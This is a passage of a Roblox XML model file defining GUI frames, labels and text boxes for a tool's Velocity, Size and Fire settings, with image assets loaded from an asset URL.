													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXCBCECCCB90E34087919B64F0717DD8EA">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXC1CBD7F4B19C496F8ED112E81F912E4B">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">1</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBXE9A38530D3FE4E17A1D14CAB85A63859">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">VelocityOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>100</XO>
												<YS>0</YS>
												<YO>45</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-115</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXD01F3D8F93784E45821840F25F0B4D2C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Velocity</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX00D4E1904ED54A7EB41864B086915698">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>45</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX3D4530E0BB5A46F5B6AFBC7257EA425B">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX63FFB636D4744EB3B78BE72A2CDECE98">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX7AC3847F73AB4941863A7136BA2BDE0C">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXDB102CF5F4154F91BEADA9F112C78596">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">90</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX7A5DC14400704C7B98EEEDA8220F1C41">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SizeOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>80</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX294EC15EB0E64B389738817D04BE2401">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Size</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX0B8C28058D2D44F59CA83DE0EC2F10FC">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>30</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXCA07B93C91CC435FA63EC89363E4ACDD">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX56CD831F2FED44A49AAEAAE8B8766CA4">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX3C481B8CB6D746BFAC13958695620E51">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXE73DF880F5A2405699BFDC1C80BA1473">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">16</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="TextLabel" referent="RBXBD4B4EC7AB954A74AE4C1432DE0B7985">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">SelectNote</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>27</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Select something to use this tool.</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">true</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.5</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">true</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBX3CE84A36E46D4FD1BB57F8047D267A85">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.675000012</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Fire</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>60</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX84F6A78BA4BF4F369CBC7D143EA1D921">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Fire</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBX0600E3D2C75D4478B97259653311E91A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=134367382</url></Content>
